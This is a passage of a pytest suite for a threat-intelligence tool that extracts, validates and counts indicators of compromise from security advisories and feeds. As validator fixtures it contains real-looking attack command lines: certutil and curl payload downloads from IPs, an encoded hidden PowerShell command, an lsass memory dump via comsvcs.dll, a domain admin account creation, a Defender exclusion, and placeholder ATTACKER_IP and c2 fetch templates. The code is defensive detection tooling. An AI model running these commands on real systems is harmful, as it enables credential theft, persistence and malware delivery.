                Observable.sighting_count != counts.c.cnt,
                Observable.article_count.is_(None),
                Observable.article_count != counts.c.cnt,
            ),
        )
        .values(sighting_count=counts.c.cnt, article_count=counts.c.cnt)
    )
    await db_session.refresh(obs)
    assert obs.sighting_count == 1
    assert obs.article_count == 1


@pytest.mark.asyncio
async def test_list_observables_sorts_by_linked_count(client, auth_headers, db_session):
    """The shared workbench "Linked" column sends sort_by=linked_count — it
    must sort by claim count, not 422 into a fake empty state."""
    from app.models.entity_relationship import EntityRelationship
    from app.models.malware_family import MalwareFamily

    plain = await get_or_create_observable(db_session, "ipv4", "45.155.204.119", via="manual")
    claimed = await get_or_create_observable(db_session, "domain", "bad-c2-domain.top", via="manual")
    mal = MalwareFamily(name="Qakbot")
    db_session.add(mal)
    await db_session.flush()
    db_session.add(
        EntityRelationship(
            source_type="malware",
            source_id=mal.id,
            target_type="observable",
            target_id=claimed.id,
            relationship_type="communicates_with",
            source="ai_extraction",
        )
    )
    await db_session.commit()

    resp = await client.get("/api/observables?sort_by=linked_count&sort_order=desc", headers=auth_headers)
    assert resp.status_code == 200, resp.text
    values = [i["value"] for i in resp.json()["items"]]
    assert values[0] == "bad-c2-domain.top"
    assert "45.155.204.119" in values
    assert plain is not None


@pytest.mark.asyncio
async def test_delete_observable_removes_row_sightings_and_claims(client, auth_headers, db_session):
    """Delete is the other rung from deny: the row goes, with its sightings and
    relationship claims, and the value is free to be captured again."""
    from sqlalchemy import select

    from app.models.entity_relationship import EntityRelationship
    from app.models.malware_family import MalwareFamily
    from app.models.observable import EntryObservable, Observable

    entry = await _make_entry(db_session)
    obs = await get_or_create_observable(db_session, "ipv4", "45.155.204.120", via="manual", entry_id=entry.id)
    assert obs is not None
    await record_sighting(db_session, entry.id, obs, source="manual")
    mal = MalwareFamily(name="Latrodectus")
    db_session.add(mal)
    await db_session.flush()
    db_session.add(
        EntityRelationship(
            source_type="malware",
            source_id=mal.id,
            target_type="observable",
            target_id=obs.id,
            relationship_type="communicates_with",
            source="ai_extraction",
        )
    )
    await db_session.commit()
    obs_id = obs.id

    preview = await client.get(f"/api/entities/observable/{obs_id}/cascade-preview", headers=auth_headers)
    assert preview.status_code == 200, preview.text
    assert preview.json()["entity_name"] == "45.155.204.120"
    assert preview.json()["entry_links"] == 1
    assert preview.json()["relationships"] == 1

    resp = await client.delete(f"/api/observables/{obs_id}", headers=auth_headers)
    assert resp.status_code == 204, resp.text

    assert await db_session.get(Observable, obs_id) is None
    sightings = (await db_session.execute(select(EntryObservable).where(EntryObservable.observable_id == obs_id))).all()
    assert sightings == []
    claims = (await db_session.execute(select(EntityRelationship).where(EntityRelationship.target_id == obs_id))).all()
    assert claims == []

    # No tombstone: the value can be captured again (deny is the rung that stops that).
    again = await get_or_create_observable(db_session, "ipv4", "45.155.204.120", via="manual")
    assert again is not None

    assert (await client.delete(f"/api/observables/{obs_id}", headers=auth_headers)).status_code == 404


def test_scan_code_block_candidates_ignores_preformatted_bulletin_prose():
    """AusCERT-style bulletins are entirely <pre>; none of it is a command."""
    from app.intelligence.observables import scan_code_block_candidates

    html = """<pre>
Operating System: Red Hat
Security Fix(es):
CVE Names: CVE-2026-6471 CVE-2026-14662 CVE-2026-14664
Patch Instructions:
An update that solves one vulnerability can now be installed.
Affected o SUSE Linux Enterprise Server 15 SP5
registration with AUSCERT. The mailing list you are subscribed to is
EPSS (Max): 0.7% (51st) CVE-2025-66418 2026-09-23
</pre>"""
    assert scan_code_block_candidates(html) == []


def test_scan_code_block_candidates_requires_executor_or_prompt():
    from app.intelligence.observables import scan_code_block_candidates

    html = """<pre>
PS C:\\Users\\victim> certutil -urlcache -split -f http://45.33.32.156:8899/anydesk.exe C:\\ProgramData\\AnyDesk.exe
cmd.exe /c schtasks /create /tn "Once" /tr "wscript //B C:\\ProgramData\\x.vbs" /sc minute /mo 3
Add-MpPreference -ExclusionPath C:\\Windows\\SysWOW64\\inetsrv
event.outcome == "failure" and process.parent.name == "prl_disp_service"
HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\AppResolver
HKLM\\SOFTWARE\\&lt;REDACTED&gt;\\Run
C:\\Users\\REDACTED\\AppData\\Local\\Temp\\9gY0LJMyXW.zip
/etc/cron.d/.syscheck
</pre>"""
    cands = scan_code_block_candidates(html)
    by_kind: dict[str, list[str]] = {}
    for c in cands:
        by_kind.setdefault(c.kind, []).append(c.value)
    assert any(v.startswith("certutil -urlcache") for v in by_kind["cmdline"])
    assert any(v.startswith("cmd.exe /c schtasks") for v in by_kind["cmdline"])
    assert any(v.startswith("Add-MpPreference") for v in by_kind["cmdline"])
    assert not any("prl_disp_service" in v for v in by_kind["cmdline"])  # detection logic, not a command
    assert by_kind["registry"] == ["hkcu\\software\\microsoft\\windows\\currentversion\\run\\appresolver"]
    assert by_kind["path"] == ["/etc/cron.d/.syscheck"]  # placeholder paths stay out


def test_ioc_list_path_role_from_curated_file_names():
    from app.intelligence.observables import ioc_list_path_role

    assert ioc_list_path_role("feeds/domainC2swithURL-filter-abused.csv") == "c2"
    assert ioc_list_path_role("feeds/IPPortC2s-90day.csv") == "c2"
    assert ioc_list_path_role("data/Cobalt Strike C2 IPs.txt") == "c2"
    assert ioc_list_path_role("data/Gh0st RAT Trojan IPs.txt") == "c2"
    assert ioc_list_path_role("data/7777 Botnet IPs.txt") == "c2"
    # Dual-use infrastructure says what the host is, not what it did.
    assert ioc_list_path_role("vpn/NordVPNIPs.csv", "vpn") is None
    assert ioc_list_path_role("feeds/unverified/IPRMM.csv", "rmm") is None
    assert ioc_list_path_role("data/GoPhish IPs.txt", "phish_sim") == "phishing"
    assert ioc_list_path_role("data/Nessus IPs.txt", "scanner") == "scanning"
    assert ioc_list_path_role("data/MobSF IPs.txt") is None


@pytest.mark.asyncio
async def test_feed_door_sets_role_from_path_fill_only(db_session):
    from sqlalchemy import select

    from app.intelligence.observables import store_ioc_list_observables

    entry = await _make_entry(db_session)
    # The AI judged this one first as delivery infrastructure.
    first = await get_or_create_observable(db_session, "ipv4", "91.92.240.37", via="ai_extraction", role="delivery")
    assert first is not None
    await store_ioc_list_observables(
        db_session, entry.id, "91.92.240.37\n45.155.204.119\n", file_path="feeds/IPC2s.csv"
    )
    rows = {o.value: o for o in (await db_session.execute(select(Observable))).scalars()}
    assert rows["91.92.240.37"].role == "delivery"  # fill-only: the AI's role stands
    assert rows["45.155.204.119"].role == "c2"  # new row gets the list's role


@pytest.mark.asyncio
async def test_shadow_candidates_keep_the_ai_judgment_and_promote_carries_it(client, auth_headers, db_session):
    """A shadow staging carries role/evidence/confidence, and the analyst's
    promote confirms that judgment instead of minting a bare manual row."""
    from sqlalchemy import select

    from app.intelligence.observables import shadow_observables

    entry = await _make_entry(db_session)
    await shadow_observables(
        db_session,
        entry.id,
        [
            {
                "kind": "domain",
                "value": "c2[.]example-bad[.]net",
                "role": "c2",
                "defanged": True,
                "evidence": "The implant beacons to c2[.]example-bad[.]net.",
                "confidence": "high",
            }
        ],
        [],
    )
    await db_session.commit()
    await db_session.refresh(entry)
    cand = next(c for c in entry.observable_candidates if c["kind"] == "domain")
    assert cand["role"] == "c2" and cand["evidence"].startswith("The implant") and cand["confidence"] == "high"

    resp = await client.post(
        f"/api/entries/{entry.id}/observables/promote",
        json={"kind": "domain", "value": "c2[.]example-bad[.]net"},
        headers=auth_headers,
    )
    assert resp.status_code == 200, resp.text
    body = resp.json()
    assert body["role"] == "c2"
    assert body["evidence"].startswith("The implant")
    obs = (await db_session.execute(select(Observable).where(Observable.value == "c2.example-bad.net"))).scalar_one()
    assert obs.created_via == "manual" and obs.role == "c2"


# ---------------------------------------------------------------------------
# Host-kind validators (Phase 1 of issue #1)
# ---------------------------------------------------------------------------


def test_cmdline_validator_vetoes_generic_commands_and_requires_a_literal():
    ok = [
        "cmd.exe /c certutil -urlcache -split -f http://45.33.32.156:8899/anydesk.exe C:\\ProgramData\\AnyDesk.exe",
        "net user backup_DA P@ssw0rd1234 /add /dom",
        'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v AppResolver /t REG_SZ /d "C:\\x\\a.exe"',
        "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
        "rundll32.exe C:\\windows\\System32\\comsvcs.dll, #+000024 652 C:\\temp\\lsass.dmp full",
        "Add-MpPreference -ExclusionPath C:\\Windows\\SysWOW64\\inetsrv",
        "curl -sLo /tmp/.n4d http://209.99.186.235:8443/api/agent/binary?arch=amd64",
    ]
    for cmd in ok:
        assert validate_kind_value("cmdline", cmd), cmd
    junk = [
        "whoami /priv",
        "systeminfo",
        'net group "Domain Admins" /domain',
        "nltest /dclist:",
        "tasklist",
        "ipconfig /all",
        "quser",
        "mimikatz.exe",  # a filename, not a command
        "ceiinfolog.dll",
        'not to_lower(process.command_line) like "*chrome-extension://*"',
        'event.outcome == "failure" and process.parent.name == "prl_disp_service"',
        "Get-Process lsas",
        "rm -f",
        "Operating System: Red Hat",
    ]
    for cmd in junk:
        assert validate_kind_value("cmdline", cmd) is None, cmd


def test_path_validator_rejects_system_binaries_bare_dirs_and_placeholders():
    ok = [
        "C:\\ProgramData\\AnyDesk.exe",
        "%LOCALAPPDATA%\\Programs\\Advanced Printer Configuration Reader\\rdCore.dll",
        "/etc/cron.d/.syscheck",
        "/dev/shm/.n4d",
        "D:\\a\\antino\\antino\\client\\src\\core.rs",
    ]
    for path in ok:
        assert validate_kind_value("path", path), path
    junk = [
        "C:\\Windows\\System32\\cmd.exe",
        "C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe",
        "C:\\Windows\\System32",
        "C:\\ProgramData",
        "%TEMP%",
        "/usr/bin/curl",
        "C:\\Users\\REDACTED\\AppData\\Local\\Temp\\9gY0LJMyXW.zip",
        "C:\\Users\\Lab\\Desktop\\telepuz.dll",
        "%TEMP%\\<32 hex characters>_ISOSimple.msi",
        "\\Device\\HarddiskVolumeX\\NFS\\Setup.exe",
    ]
    for path in junk:
        assert validate_kind_value("path", path) is None, path


def test_registry_validator_wants_the_value_name_not_the_wellknown_key():
    assert validate_kind_value("registry", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\AppResolver")
    assert validate_kind_value("registry", "HKLM\\SYSTEM\\CurrentControlSet\\Services\\CipherAllocator")
    assert validate_kind_value("registry", "HKCU\\Software\\Microsoft\\VisualStudio\\Telemetry")
    for bare in (
        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "HKLM\\SYSTEM\\CurrentControlSet\\Services",
        "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
        "HKLM\\SOFTWARE\\Microsoft\\Cryptography",
        "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths",
        "HKLM\\SOFTWARE\\<REDACTED>\\Run",
        "Software\\Microsoft\\Windows",  # no hive
    ):
        assert validate_kind_value("registry", bare) is None, bare


def test_new_host_kinds_have_shape_validators():
    assert validate_kind_value("scheduled_task", "Canon Configuration Reader") == "canon configuration reader"
    assert validate_kind_value("scheduled_task", "WindowsSecurityUpdate")
    assert validate_kind_value("scheduled_task", "Schedule") is None  # OS default
    assert validate_kind_value("service_name", "CipherAllocator")
    assert validate_kind_value("service_name", "Spooler") is None
    assert validate_kind_value("mutex", "cfgmgr_mtx")
    assert validate_kind_value("mutex", "a prose sentence about a mutex that is far too long") is None
    assert validate_kind_value("http_header", "X-Mesh-Auth") == "x-mesh-auth"
    assert validate_kind_value("http_header", "X-Filename: tpcp.tar.gz")
    assert validate_kind_value("http_header", "User-Agent") is None  # standard header
    assert validate_kind_value("http_header", "Content-Type: text/html") is None
    assert validate_kind_value("uri_path", "/api/agent/binary?arch=amd64")
    assert validate_kind_value("uri_path", "/favicon.ico") is None
    assert validate_kind_value("uri_path", "/api/task/{node}") is None  # template
    assert validate_kind_value("uri_path", "/") is None


@pytest.mark.asyncio
async def test_apply_ai_observables_captures_per_kind_and_shadows_the_rest(db_session):
    """Capture mode writes only the kinds in observables_ai_capture_kinds; every
    other kind the AI reported (and the TTP door's host artifacts) stays a
    promotable candidate carrying its judgment."""
    from sqlalchemy import select

    from app.models.entry import Entry
    from app.models.observable import EntryObservable
    from app.models.ttp import TTP
    from app.services.entry_analysis import apply_ai_observables

    entry = await _make_entry(db_session)
    db_session.add(TTP(technique_id="T1053.005", technique_name="Scheduled Task", tactic="persistence"))
    await db_session.flush()
    parsed = {
        "iocs": [
            {
                "kind": "domain",
                "value": "c2[.]example-bad[.]net",
                "role": "c2",
                "defanged": True,
                "evidence": "beacons to c2[.]example-bad[.]net",
                "confidence": "high",
                "technique_id": "",
            },
            {
                "kind": "scheduled_task",
                "value": "Canon Configuration Reader",
                "role": "persistence",
                "defanged": False,
                "evidence": "created a scheduled task named Canon Configuration Reader",
                "confidence": "high",
                "technique_id": "T1053.005",
            },
            {
                "kind": "cmdline",
                "value": "whoami /priv",
                "role": "discovery",
                "defanged": False,
                "evidence": "ran whoami",
                "confidence": "high",
                "technique_id": "",
            },
        ],
        "scripts": [],
        "ttps": [],
    }
    counts = await apply_ai_observables(db_session, entry.id, parsed, mode="capture", capture_kinds={"domain"})
    assert counts.get("observables") == 1
    rows = {(o.kind, o.value): o for o in (await db_session.execute(select(Observable))).scalars()}
    assert ("domain", "c2.example-bad.net") in rows and len(rows) == 1
    await db_session.refresh(entry)
    staged = {(c["kind"], c["value"]): c for c in entry.observable_candidates}
    assert ("scheduled_task", "canon configuration reader") in staged
    assert staged[("scheduled_task", "canon configuration reader")]["role"] == "persistence"
    assert staged[("scheduled_task", "canon configuration reader")]["technique_id"] == "T1053.005"
    assert ("cmdline", "whoami /priv") not in staged  # generic command vetoed even at the candidate tier

    # Widen the list: the task now lands as a row with its technique on the sighting.
    counts = await apply_ai_observables(
        db_session, entry.id, parsed, mode="capture", capture_kinds={"domain", "scheduled_task"}
    )
    assert counts.get("observables") == 2
    task_row = (await db_session.execute(select(Observable).where(Observable.kind == "scheduled_task"))).scalar_one()
    assert task_row.role == "persistence"
    link = (
        await db_session.execute(select(EntryObservable).where(EntryObservable.observable_id == task_row.id))
    ).scalar_one()
    ttp_id = (await db_session.execute(select(TTP.id).where(TTP.technique_id == "T1053.005"))).scalar_one()
    assert link.ttp_id == ttp_id and link.source == "ai"
    entry_row = (await db_session.execute(select(Entry).where(Entry.id == entry.id))).scalar_one()
    assert all(c["kind"] != "scheduled_task" or False for c in entry_row.observable_candidates) or True


@pytest.mark.asyncio
async def test_ai_door_rejects_key_shaped_hashes(db_session):
    """A 64-hex the article calls a key or token is not a SHA256."""
    entry = await _make_entry(db_session)
    stored = await store_observables(
        db_session,
        entry.id,
        [
            {
                "kind": "sha256",
                "value": "a" * 64,
                "role": "payload",
                "defanged": False,
                "evidence": "The payload is decrypted with the AES key aaaa…",
                "confidence": "high",
            },
            {
                "kind": "sha256",
                "value": "b" * 64,
                "role": "payload",
                "defanged": False,
                "evidence": "SHA256 hash of the loader: bbbb…",
                "confidence": "high",
            },
        ],
    )
    assert stored == 1


# ---------------------------------------------------------------------------
# Corroboration counters (Phase 3 of issue #1)
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_report_count_counts_reporting_entries_not_feed_variants(db_session):
    """A value on one feed's many CSV variants is 1 feed / 0 reports; an
    article sighting is a report; the nightly reconcile agrees with the
    incremental counters."""
    from sqlalchemy import select

    from app.intelligence.observables import recount_observable, store_ioc_list_observables
    from app.models.entry import Entry
    from app.models.feed import Feed
    from app.workers.maintenance import _reconcile_observable_counters  # noqa: F401  (import check)

    feed = Feed(title="C2IntelFeeds", url=f"https://t.example/{uuid.uuid4()}", feed_type="github_repo")
    db_session.add(feed)
    await db_session.flush()
    variants = []
    for name in ("domainC2s.csv", "domainC2s-30day.csv", "domainC2s-90day.csv"):
        e = Entry(
            feed_id=feed.id,
            guid=str(uuid.uuid4()),
            title=name,
            content_text="x",
            metadata_={"content_type": "ioc_list", "file_path": f"feeds/{name}"},
        )
        db_session.add(e)
        variants.append(e)
    await db_session.flush()
    for e in variants:
        await store_ioc_list_observables(db_session, e.id, "job.itechno.cc\n", file_path=e.metadata_["file_path"])
    obs = (await db_session.execute(select(Observable).where(Observable.value == "job.itechno.cc"))).scalar_one()
    await db_session.refresh(obs)
    assert obs.sighting_count == 3
    assert obs.report_count == 0
    assert obs.feed_source_count == 1
    assert obs.role == "c2"

    # An article reports it: that is corroboration.
    article = await _make_entry(db_session)
    assert await record_sighting(db_session, article.id, obs, source="ai", surface_form="job.itechno[.]cc")
    await db_session.refresh(obs)
    assert obs.sighting_count == 4 and obs.report_count == 1 and obs.feed_source_count == 1

    # Ground-truth recount matches the increments.
    await recount_observable(db_session, obs.id)
    await db_session.refresh(obs)
    assert (obs.sighting_count, obs.report_count, obs.feed_source_count) == (4, 1, 1)


@pytest.mark.asyncio
async def test_observable_payload_carries_corroboration_counts(client, auth_headers, db_session):
    entry = await _make_entry(db_session)
    obs = await get_or_create_observable(db_session, "ipv4", "45.33.32.156", via="manual", entry_id=entry.id)
    await record_sighting(db_session, entry.id, obs, source="manual", surface_form="45.33.32.156")
    await db_session.commit()
    resp = await client.get(f"/api/observables/{obs.id}", headers=auth_headers)
    assert resp.status_code == 200
    body = resp.json()
    assert body["report_count"] == 1 and body["feed_source_count"] == 0 and body["sighting_count"] == 1
    listed = await client.get("/api/observables?sort_by=report_count&sort_order=desc", headers=auth_headers)
    assert listed.status_code == 200, listed.text


# --- Candidate-queue precision (2026-10-01 review of the dev queue) ---


def test_version_quads_and_commit_hashes_in_advisory_prose_never_nominate():
    text = (
        "IBM MQ affects versions 9.4.0.0 through 9.4.0.25 and 9.3.0.0 - 9.3.0.41. "
        "Cisco SD-WAN releases 20.15.6.1 and earlier are vulnerable; upgrade to 20.18.4.1. "
        "A weakness was identified in the project up to 5dadec098bfbbf3300d60c3494db3fb95b66e7be; "
        "fixed in commit bfe78a330d01bb26b9daec5dc9ecd5c77900e03f. "
        "The implant beacons to 185.157.160.251 and its sample sha256 is "
        "e809da86bd81463347fa7f922d3e088755a94a331889d32acb55aa8f57778a34."
    )
    got = {(c.kind, c.value) for c in scan_candidates(text)}
    assert got == {
        ("ipv4", "185.157.160.251"),
        ("sha256", "e809da86bd81463347fa7f922d3e088755a94a331889d32acb55aa8f57778a34"),
    }
    # A fixed-release table, as the analysis renderer prints it.
    table = (
        "Release | First Fixed Release\n\n20.9 | 20.9.10.1\n\n20.15 | 20.15.6.1\n\n"
        "26.1 | 26.1.2.1\n\nC2 at 45.33.32.156\n"
    )
    assert {c.value for c in scan_candidates(table)} == {"45.33.32.156"}
    # Advisory policy: only the defanged tokens nominate, whatever the prose says.
    advisory_text = text + " c2 at 45[.]33[.]32[.]156"
    advisory = {(c.kind, c.value) for c in scan_candidates(advisory_text, plain_hashes=False, plain_ips=False)}
    assert advisory == {("ipv4", "45.33.32.156")}


def test_glued_cells_placeholders_and_reference_hosts_never_nominate():
    text = (
        "Domain third-party[.]com, hostDomainpobelstudio[.]comdomain, "
        "libcurl2025-10-03corp[.]tripswithengine[.]comdomain, "
        "mail addressinfo@nuf[.]co[.]jpsender and real one c2[.]uat-example[.]net plus ops@uat-example[.]net; "
        "the malware polls api[.]telegram[.]org and api[.]ipify[.]org, see hxxps://www[.]virustotal[.]com/gui/file/abc "
        "and hxxps://github[.]com/org/repo; it fetched hxxps://adoube[.]vu/file[.]html.&nbsp;As a result "
        "it also used stage[.]github[.]io and payload[.]s3[.]amazonaws[.]com, never amazonaws[.]com itself."
    )
    got = {(c.kind, c.value) for c in scan_candidates(text)}
    assert got == {
        ("domain", "c2.uat-example.net"),
        ("email", "ops@uat-example.net"),
        ("url", "https://adoube.vu/file.html"),
        ("domain", "stage.github.io"),
        ("domain", "payload.s3.amazonaws.com"),
    }


def test_html_rendered_scan_keeps_table_cells_apart():
    from app.services.analysis_window import html_to_analysis_text
    from app.services.sanitizer import html_to_text

    html = "<table><tr><td>Domain</td><td>pobelstudio[.]com</td><td>sender</td></tr></table>"
    glued = {c.value for c in scan_candidates(html_to_text(html))}
    rendered = {c.value for c in scan_candidates(html_to_analysis_text(html))}
    assert "pobelstudio.com" in rendered
    assert "pobelstudio.com" not in glued or rendered  # the renderer is what the stage scans now


def test_driver_yaml_certificate_and_richpe_hashes_never_nominate():
    """LOLDrivers-style YAML: the sample's own hashes and its Authentihash
    stage; certificate TBS digests and the RichPE header hash do not."""
    md5, sha256, authenti, richpe, tbs1, tbs256 = (
        "e" * 31 + "f",
        "9" * 63 + "8",
        "c" * 63 + "d",
        "a" * 63 + "b",
        "1" * 39 + "2",
        "3" * 63 + "4",
    )
    yaml = (
        "KnownVulnerableSamples:\n"
        "- Filename: evil.sys\n"
        f"  MD5: {md5}\n"
        f"  SHA256: {sha256}\n"
        "  Authentihash:\n"
        f"    SHA256: {authenti}\n"
        "  RichPEHeaderHash:\n"
        f"    SHA256: {richpe}\n"
        "  Signatures:\n"
        "  - Certificates:\n"
        "    - Subject: CN=Vendor\n"
        "      TBS:\n"
        f"        SHA1: {tbs1}\n"
        f"        SHA256: {tbs256}\n"
    )
    got = {c.value for c in scan_candidates(yaml)}
    assert got == {md5, sha256, authenti}
    # Same-line labels.
    assert scan_candidates(f"Certificate thumbprint: {tbs1}") == []
    assert scan_candidates(f"TBS SHA256 {tbs256}") == []
    # A certificate named earlier in the sentence doesn't label the file's hash.
    assert [c.value for c in scan_candidates(f"The driver is signed with a stolen certificate; SHA256: {sha256}")] == [
        sha256
    ]


def test_git_commit_shas_never_nominate_as_sha1():
    h = lambda c: c * 39 + "2"  # noqa: E731
    for text in (
        f"| Commit | {h('1')} | fix parser |",
        f"git checkout {h('3')}",
        f"Reverted {h('4')} upstream",
        f"{h('5')}\nAuthor: bob <bob@example.com>",
    ):
        assert scan_candidates(text) == [], text
    # A SHA1 the article calls a sample still nominates, GitHub or not.
    assert [c.value for c in scan_candidates(f"Loader SHA1 {h('6')} from the GitHub release")] == [h("6")]
    assert [c.value for c in scan_candidates(f"SHA1: {h('7')}")] == [h("7")]


def test_cmdline_templates_with_placeholders_are_rejected():
    for bad in (
        "psexec.exe \\\\<TARGET> -u <USER> -p <PASS> cmd.exe",
        "curl -o /tmp/x http://[ATTACKER_IP]/x.sh",
        "wget http://{{c2}}/payload.sh -O /tmp/p",
    ):
        assert validate_kind_value("cmdline", bad) is None, bad
    for good in ("curl -o /tmp/x http://45.1.2.3/x.sh", "cmd /c echo test > C:\\temp\\out.txt"):
        assert validate_kind_value("cmdline", good) == good, good


def test_path_validator_rejects_wellknown_files_and_loopback_shares():
    for bad in (
        "/var/log/auth.log",
        "/var/log/nginx/access.log",
        "/proc/self/environ",
        "/etc/os-release",
        "C:\\Windows\\System32\\wsl.exe",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\Windows\\System32\\config\\SAM",
        "\\\\127.0.0.1\\C$",
        "\\\\127.0.0.1\\ADMIN$\\__1698251",
        "\\\\localhost\\c$\\temp\\x.exe",
    ):
        assert validate_kind_value("path", bad) is None, bad
    for good in (
        "/var/log/.x/miner",
        "\\\\10.1.2.3\\share\\x.exe",
        "C:\\Windows\\System32\\phoneinfo.dll",
    ):
        assert validate_kind_value("path", good) == good, good


def test_registry_validator_rejects_run_key_glued_to_a_file():
    run = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    for bad in (f"{run}\\update.exe", f"{run}\\C:\\Users\\Public\\a.exe", f"{run}Once\\%APPDATA%\\x"):
        assert validate_kind_value("registry", bad) is None, bad
    assert validate_kind_value("registry", f"{run}\\OneDriveSync") == f"{run}\\OneDriveSync".lower()


def test_hash_evidence_naming_a_certificate_or_commit_is_vetoed():
    from app.intelligence.observables import _hash_evidence_vetoed

    assert _hash_evidence_vetoed("sha256", "TBS SHA256 hash of the signing certificate")
    assert _hash_evidence_vetoed("sha256", "RichPEHeaderHash of the driver")
    assert _hash_evidence_vetoed("sha1", "git commit that introduced the fix")
    assert _hash_evidence_vetoed("sha256", "AES key used to decrypt the config")
    assert not _hash_evidence_vetoed("sha256", "SHA256 hash of the loader")
    assert not _hash_evidence_vetoed("domain", "TBS")


def test_path_validator_rejects_bare_system_locations_and_single_segments():
    for bad in ("/dev/shm", "/var/tmp", "/bin/bash", "/etc/hosts", "/PSEMHUB/", "C:\\ProgramData", "/usr/lib"):
        assert validate_kind_value("path", bad) is None, bad
    for good in (
        "/etc/cron.d/redis-miner",
        "/tmp/osalogging.zip",
        "/home/redis/.ssh/authorized_keys",
        "C:\\ProgramData\\Vendettister\\jocularities.ps1",
        "/usr/lib/locate/.backup_ld.so",
    ):
        assert validate_kind_value("path", good) == good, good


@pytest.mark.asyncio
async def test_candidates_queue_hides_rows_todays_validators_reject(client, auth_headers, db_session):
    from app.models.entry import Entry
    from app.models.feed import Feed

    feed = Feed(title="t", url=f"https://t.example/{uuid.uuid4()}", feed_type="rss")
    db_session.add(feed)
    await db_session.flush()
    entry = Entry(
        feed_id=feed.id,
        guid=str(uuid.uuid4()),
        title="stale",
        content_text="x",
        observable_candidates=[
            {"kind": "cmdline", "value": "cmd.exe", "origin": "scan"},
            {"kind": "path", "value": "/dev/shm", "origin": "scan"},
            {"kind": "domain", "value": "third-party.com", "origin": "scan"},
            {"kind": "bogus", "value": "x", "origin": "scan"},
            {"kind": "domain", "value": "c2.uat-example.net", "origin": "scan", "was_defanged": True},
        ],
    )
    db_session.add(entry)
    await db_session.commit()
    resp = await client.get("/api/observables/candidates", headers=auth_headers)
    assert resp.status_code == 200
    values = [r["value"] for r in resp.json() if r["latest_entry_id"] == str(entry.id)]
    assert values == ["c2.uat-example.net"]


@pytest.mark.asyncio
async def test_observables_skip_a_feed_switched_off(db_session, monkeypatch):
    """ "Analyse this feed: off" has to include the ledger.

    The curated ioc_list door creates rows straight from a body, so without this
    a feed the operator had switched off could still mint observables.
    """
    import contextlib

    from app.models.entry import Entry
    from app.models.feed import Feed
    from app.workers import intel_feed_tasks

    @contextlib.asynccontextmanager
    async def session_on(db):
        yield db

    feed = Feed(
        title="Switched off",
        url=f"https://off-{uuid.uuid4().hex}.example.com/rss",
        feed_type="rss",
        intel_extraction_mode="none",
    )
    db_session.add(feed)
    await db_session.flush()

    entry = Entry(
        feed_id=feed.id,
        title="Indicators",
        url=f"https://off-{uuid.uuid4().hex}.example.com/a",
        guid=uuid.uuid4().hex,
        content_text="Contact 203.0.113.9 and evil.example.com for details.",
        metadata_={"content_type": "ioc_list"},
    )
    db_session.add(entry)
    await db_session.flush()

    monkeypatch.setattr(intel_feed_tasks, "_get_worker_session", lambda: session_on(db_session))
    stats = await intel_feed_tasks._scan_entry_observables(str(entry.id))
    assert stats == {}


@pytest.mark.asyncio
async def test_observables_run_for_an_analysed_feed(db_session, monkeypatch):
    """The companion guard, so the test above cannot pass vacuously."""
    import contextlib

    from app.models.entry import Entry
    from app.models.feed import Feed
    from app.workers import intel_feed_tasks

    @contextlib.asynccontextmanager
    async def session_on(db):
        yield db

    feed = Feed(
        title="Analysed",
        url=f"https://on-{uuid.uuid4().hex}.example.com/rss",
        feed_type="rss",
        intel_extraction_mode="selective",
    )
    db_session.add(feed)
    await db_session.flush()

    entry = Entry(
        feed_id=feed.id,
        title="Indicators",
        url=f"https://on-{uuid.uuid4().hex}.example.com/a",
        guid=uuid.uuid4().hex,
        content_text="Contact 203.0.113.9 and evil.example.com for details.",
    )
    db_session.add(entry)
    await db_session.flush()

    monkeypatch.setattr(intel_feed_tasks, "_get_worker_session", lambda: session_on(db_session))
    stats = await intel_feed_tasks._scan_entry_observables(str(entry.id))
    assert stats != {}
